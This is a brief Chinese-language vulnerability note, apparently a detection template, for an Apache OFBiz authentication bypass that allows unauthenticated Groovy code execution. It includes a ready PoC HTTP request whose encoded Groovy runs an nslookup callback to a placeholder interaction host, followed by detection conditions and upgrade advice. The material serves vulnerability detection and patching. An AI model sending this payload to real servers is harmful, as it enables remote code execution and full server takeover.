验证漏洞存在方法
    - 发送特定的POST请求到/webtools/control/ProgramExport端点
    - 检查响应中是否包含OFBiz.Visitor头部
    - 通过DNS交互验证命令执行

漏洞利用方法
    - 该漏洞允许攻击者绕过认证实现简单的服务器端请求伪造(SSRF)，进而执行任意Groovy代码
    - 未认证的攻击者可以绕过认证并执行任意Groovy代码，导致远程代码执行和系统完全被控制
    - 漏洞利用通过向/webtools/control/ProgramExport端点发送恶意Groovy代码实现

PoC:
```http
POST /webtools/control/ProgramExport;/?USERNAME=&PASSWORD=&requirePasswordChange=Y HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

groovyProgram=import+groovy.lang.GroovyShell%3B%0A%0AString+expression+%3D+%22'nslookup+{{interactsh-url}}'.execute()%22%3B%0AGroovyShell+gs+%3D+new+GroovyShell()%3B%0Ags.evaluate(expression)%3B
```

检测条件:
- 响应头部包含: OFBiz.Visitor=
- DNS交互验证成功

修复建议:
- 升级Apache OFBiz到版本18.12.11或更高版本
